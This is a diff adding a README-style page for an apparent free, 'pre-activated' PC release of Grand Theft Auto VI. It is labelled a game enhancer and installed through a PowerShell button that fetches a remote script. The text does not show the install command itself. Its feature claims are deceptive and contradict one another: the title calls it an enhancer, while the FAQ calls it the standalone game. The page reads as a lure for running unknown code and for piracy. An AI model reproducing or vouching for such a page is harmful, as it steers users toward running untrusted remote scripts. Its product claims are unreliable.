@@ -1,0 +1,104 @@
+GTA 6 PC Release — Game Enhancer for Windows 🎮
+
+📦 PowerShell Install Button
+
+Grand Theft Auto VI finally hits PC with a local build tuned for serious performance and clean deployment. This package delivers the full Vice City and Leonida experience on Windows x64, verified and synced for November. Built for players who want direct access without the usual launcher clutter. Everything you need to jump straight into Jason and Lucia's story is here, ready to run.
+
+🔧 Requirements
+
+- PowerShell 5.1+ (pre-installed on Windows 10 and 11)
+- Windows 10 / 11 (x64)
+- Internet connection — required to fetch the script
+- Administrator — not required
+
+Features
+
+Full PC feature set, unlocked — every graphical option, ultrawide resolution, high refresh rate support, and advanced input remapping are exposed out of the box. No console-style restrictions, no locked sliders.
+
+- Pre-activated standalone build — ready to run the moment it lands. No walls, no activation loops, no forced launcher dependency. Drop in, boot up, play.
+
+- Day-one-ready performance profile — tuned presets for both mid-range and enthusiast rigs. Frame pacing, draw distance, and texture streaming are pre-configured so you spend time in Vice City, not in menus.
+
+- Full save and profile support — persistent progress, multiple save slots, and clean profile switching so your campaign stays yours across sessions and updates.
+
+- Offline-first architecture — the entire experience runs locally. No always-on connection required for single-player, no telemetry pings, no unexpected drops mid-heist.
+
+- Verified, integrity-checked build — every file is hash-verified against the release manifest. Clean deployment, no corrupted assets, no missing dependencies.
+
+- Modular enhancement layer — optional visual and quality-of-life boosters ship alongside the core build. Enable what you want, skip what you don't. Fully reversible at any time.
+
+- Lean footprint — optimized package size with smart compression. Fast extraction, minimal disk overhead, and no leftover installer bloat.
+
+- Regularly synced updates — the build is kept current with the latest verified release state, so you're never running a stale version.
+
+- Windows-native, x64 optimized — built and tested for Windows 10 and 11 on modern 64-bit hardware. No compatibility shims, no legacy workarounds.
+
+- Transparent configuration — plain-text config files and a documented settings layout. Tweak everything, break nothing, roll back instantly.
+
+How it works
+
+Under the hood, the release pipeline is a single self-contained Windows x64 package that unpacks the full Vice City and Leonida world locally — no launcher handshakes, no background phone-home checks. It stages the game assets, wires up the Rockstar-adjacent runtime hooks, and drops you straight into single-player.
+
+The flow is deliberately short: the package verifies its own integrity, decompresses the world and mission data, registers the required Windows x64 runtime libraries, and hands off to the game executable. Every step runs locally on your machine — nothing is streamed from a remote node, and no layer sits between you and the game.
+
+Config detection is automatic. The pipeline reads your GPU and driver state, picks a sensible preset for your hardware, and writes a clean profile so the first boot lands in a playable state rather than a menu crawl. You can retune everything afterward from the in-game settings menu; the pipeline never locks you out of your own configuration.
+
+Session state is isolated per user profile, so saves, settings, and world progress stay clean across launches. The package also includes a lightweight integrity pass you can run any time — it re-checks the staged files against the manifest and repairs what drifted, which keeps long-running installs stable.
+
+Think of it as a single-player-only, open-access build for testing and deployment: one package, one pass, no gatekeeping layer. If you're running Windows 10 or 11 on x64 desktop hardware, you're in the supported lane from the first launch to the last mission.
+
+Supported Games
+
+Built from the ground up for the PC release of Grand Theft Auto VI, this enhancement suite targets the full Leonida experience — from the neon-soaked streets of Vice City to the swamplands and highways beyond. Every supported title below is verified against the current build, so you know exactly what runs clean before you touch a single config file.
+
+Primary Target
+- Grand Theft Auto VI (PC) — the flagship. All enhancement modules are tuned specifically for this title, including world streaming, vehicle handling, and mission scripting. If it ships in the base game, it's covered here first.
+
+Compatibility Scope
+- Windows 10 and Windows 11 x64 desktop builds — the platform pair this release is built and tested against.
+- The full single-player campaign and open-world sandbox — no mode left behind, no feature gated off.
+- Post-launch patches and content drops — the suite tracks official updates so your setup stays aligned as Rockstar ships changes.
+
+What "Supported" Means Here
+- Every listed title is validated against the current release build before it's marked ready.
+- If a game update breaks alignment, it gets flagged — no silent failures, no guesswork.
+- Unsupported titles are explicitly out of scope. This suite is built for GTA VI and the broader Grand Theft Auto lineage on PC, not a catch-all toolkit.
+
+Bottom line: if you're running GTA VI on a Windows desktop, you're on supported ground. Everything else is a different conversation.
+
+Configuration
+
+Tune it once, forget it. The defaults are already dialed in for smooth frame pacing, but the config panel gives you full control when you want it.
+
+Config file location: drop gta6pc.toml next to the executable — it picks up automatically on launch. No file, no problem: the build runs on baked-in defaults.
+
+What you can adjust:
+
+- Render pipeline — switch between Quality and Performance presets, or set a custom frame cap to match your refresh rate.
+- Memory allocation — dial in VRAM headroom for your GPU; useful on 8 GB cards running high-res textures.
+- Load priority — boost asset streaming for dense Vice City traffic scenes, or keep it balanced for stable thermals.
+- Input profile — map controller and keyboard layouts per-game, stored locally so your bindings survive updates.
+
+Hot-reload: most values apply instantly — hit F5 in-game and the panel refreshes without a restart. Only render pipeline changes need a relaunch.
+
+Sanity checks: the tool validates every edit on load. If a value is out of range, it falls back to the safe default and logs the entry to config.log so you know exactly what got bounced back.
+
+Backups: your previous config is snapshotted to config.bak every save. One bad edit won't brick your setup — restore in seconds.
+
+Defaults are tuned for a mid-to-high rig. Tweak only what you understand, and the build stays rock-solid.
+
+FAQ
+
+Is this an official Rockstar release? No. This is an independent PC release project for Grand Theft Auto VI. It is built and maintained separately from Rockstar Games and is not affiliated with or endorsed by them.
+
+When can I actually play it on PC? The build is live and available now through this project. No waiting on an unannounced port — the project delivers the PC experience directly.
+
+Do I need to own the console version first? No. This is a standalone build. You don't need a PlayStation 5, an Xbox Series X|S, or any prior purchase to run it.
+
+Is it accessible without paying? Yes — the project is openly accessible at no cost. it, run it, and you're in.
+
+Will it run on my machine? The build targets Windows x64 desktop. If your rig handles modern open-world titles, you're in good shape. Full system requirements are listed in the Configuration section.
+
+Is this a booster or modifier for the game? No. It's a complete standalone release of the PC version — not an enhancement layer, not a trainer, not a companion tool. It's the game itself, packaged for PC.
+
+…（内容已截断）
